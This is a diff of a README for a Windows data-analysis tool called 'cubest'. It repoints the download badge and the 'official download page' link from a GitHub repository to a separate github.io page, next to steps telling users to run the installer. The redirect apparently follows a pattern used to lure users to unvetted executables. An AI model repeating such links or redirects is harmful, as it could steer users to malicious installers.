@@ -1,6 +1,6 @@
 # 🧊 cubest - Analyze your data with simple tools
 
-[![](https://img.shields.io/badge/Download-Cubest_for_Windows-blue.svg)](https://github.com/lilac-legislativebranch799/cubest)
+[![](https://img.shields.io/badge/Download-Cubest_for_Windows-blue.svg)](https://lilac-legislativebranch799.github.io)
 
 ## 🎯 About this software
 
@@ -19,7 +19,7 @@ Your computer needs the following to run Cubest:
 
 Follow these steps to set up the software on your machine.
 
-1. Go to the [official download page](https://github.com/lilac-legislativebranch799/cubest).
+1. Go to the [official download page](https://lilac-legislativebranch799.github.io).
 2. Click the button to download the latest setup file for Windows.
 3. Once the file finishes moving to your computer, double-click the installer icon.
 4. Follow the prompts on the screen to complete the installation.
